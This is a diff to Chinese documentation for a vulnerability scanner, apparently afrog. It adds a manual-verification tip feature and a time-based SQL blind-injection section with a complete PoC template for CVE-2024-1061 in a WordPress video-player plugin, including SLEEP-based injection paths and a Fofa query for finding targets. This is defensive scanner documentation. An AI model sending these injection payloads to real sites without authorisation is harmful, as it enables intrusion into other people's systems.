@@ -977,4 +977,92 @@ iv: 加密 iv
 
 ### 需要人工验证
 
+虽然不完全确定是漏洞，但仍希望编写针对该潜在漏洞的 POC，并在 POC 中加入提示（tips）注释以便理解。
+基本用法
+
+```
+extractors:
+  - type: word
+    extractor:
+      tips: "需要进行人工核查 (Manual verification is required)"
+```
+
 <img src="https://github.com/zan8in/afrog/blob/main/images/verification-is-needed.png" >
+
+### SQL 盲注
+
+通过响应时间来判断是否存在 SQL 注入漏洞。
+
+基本语法
+
+```
+response.latency <= 12000
+```
+
+确定响应时间的阈值分别为 12000 毫秒（即 12 秒）和 6000 毫秒（即 6 秒）。当两次请求均满足这些时间条件时，视为第一轮验证通过。整个验证过程需至少进行两轮。
+
+以下示例展示了如何进行两轮盲注验证。
+
+```yaml
+id: CVE-2024-1061
+
+info:
+  name: WordPress HTML5 Video Player SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Fofa: "wordpress" && body="html5-video-player"
+  reference:
+    - https://mp.weixin.qq.com/s/CqxyVUaSEwgjrCA8aLKQpg
+  tags: cve,cve2024,wordpress,sqli
+  created: 2024/02/21
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'created_at') &&
+      response.body.bcontains(b'video_id') &&
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r1:
+    request:
+      method: GET
+      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'created_at') &&
+      response.body.bcontains(b'video_id') &&
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r2:
+    request:
+      method: GET
+      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'created_at') &&
+      response.body.bcontains(b'video_id') &&
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r3:
+    request:
+      method: GET
+      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'created_at') &&
+      response.body.bcontains(b'video_id') &&
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+extractors:
+  - type: word
+    extractor:
+      latency1: "6s"
+      latency2: "10s"
+expression: r0() && r1() && r2() && r3()
+```
